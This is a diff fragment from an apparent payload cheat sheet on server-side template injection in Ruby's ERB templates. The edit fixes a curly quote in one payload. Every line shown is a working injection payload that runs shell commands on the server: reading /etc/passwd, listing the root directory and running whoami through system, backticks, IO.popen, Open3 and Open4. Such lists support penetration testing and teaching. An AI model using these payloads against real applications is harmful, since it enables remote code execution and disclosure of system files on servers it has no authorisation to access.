@@ -97,7 +97,7 @@ Execute code using SSTI for ERB engine.
 <%= system('cat /etc/passwd') %>
 <%= `ls /` %>
 <%= IO.popen('ls /').readlines()  %>
-<% require 'open3’ %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
 
